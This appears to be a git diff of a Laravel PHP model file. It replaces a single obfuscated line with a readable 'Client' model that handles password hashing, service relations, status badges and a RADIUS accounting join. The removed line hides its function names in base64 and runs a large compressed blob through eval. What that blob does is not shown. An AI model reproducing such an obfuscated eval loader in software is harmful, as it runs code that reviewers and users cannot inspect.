@@ -1,1 +1,109 @@
-<?php $_='ffb87629';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='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'; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Models;
+
+use Illuminate\Database\Eloquent\Factories\HasFactory;
+use Illuminate\Database\Eloquent\Model;
+use Parental\HasParent;
+
+use DB;
+
+class Client extends User
+{
+    use HasFactory, HasParent;
+
+    public function setPasswordAttribute($value)
+    {
+        $this->attributes["password"] = bcrypt($value);
+    }
+
+    public function services()
+    {
+        return $this->hasMany(Service::class);
+    }
+
+    public function messages()
+    {
+        return $this->hasMany(Message::class);
+    }
+   
+    public function scopeIsActive($query)
+    {
+        return $query->whereHas("services", function ($service) {
+            return $service->where("is_active", "=", 1);
+        });
+    }
+
+    public function scopeInactive($query, $includeNoServices = false)
+    {
+        if ($includeNoServices) {
+            return $query->whereDoesntHave('services')->orWhereHas('services', function ($serviceQuery) {
+                $serviceQuery->where('is_active', 0);
+            });
+        } else {
+            return $query->whereHas('services', function ($serviceQuery) {
+                $serviceQuery->where('is_active', 0);
+            });
+        }
+    }
+
+
+    public function status()
+    {
+        if ($this->services->count() === 0) {
+            return "<span class='badge badge-soft-info badge-border text-uppercase'>No Service</span>";
+        }
+
+        $isActive = $this->services->where('is_active', '=', 1)->count() > 0;
+
+        $badgeType = $isActive ? 'success' : 'danger';
+        $statusText = $isActive ? 'Active' : 'Blocked';
+
+        return "<span class='badge badge-soft-$badgeType badge-border text-uppercase'>$statusText</span>";
+    }
+
+    public function apiStatus()
+    {
+        if ($this->services->count() === 0) {
+            return 'No Service';
+        }
+
+        $isActive = $this->services->where('is_active', '=', 1)->count() > 0;
+
+        $statusText = $isActive ? 'Active' : 'Blocked';
+
+        return $statusText;
+    }
+
+
+
+    public function delete()
+    {
+        $this->messages()->delete();
+
+        return parent::delete();
+    }
+
+    // Define the relationship with Service model
+    public function activeServices()
+    {
+        // Subquery to fetch the latest radacctid for each framedipaddress
+        $latestIdsSubquery = DB::table('radacct as r2')
+            ->select('r2.framedipaddress', DB::raw('MAX(r2.radacctid) as max_id'))
+            ->whereNull('r2.acctstoptime')
+            ->groupBy('r2.framedipaddress');
+
+        // Join the services table with the result of the subquery and the radacct table
+        return $this->hasMany(Service::class)
+            ->joinSub($latestIdsSubquery, 'latest_ids', function ($join) {
+                $join->on('services.ipaddress', '=', 'latest_ids.framedipaddress');
+            })
+            ->join('radacct as r1', function ($join) {
+                $join->on('services.ipaddress', '=', 'r1.framedipaddress')
+                    ->where('r1.radacctid', '=', DB::raw('latest_ids.max_id'))
+                    ->whereNull('r1.acctstoptime');
+            })
+            ->select('services.*', 'r1.*');  // Ensure you fetch all necessary columns
+    }
+
+}
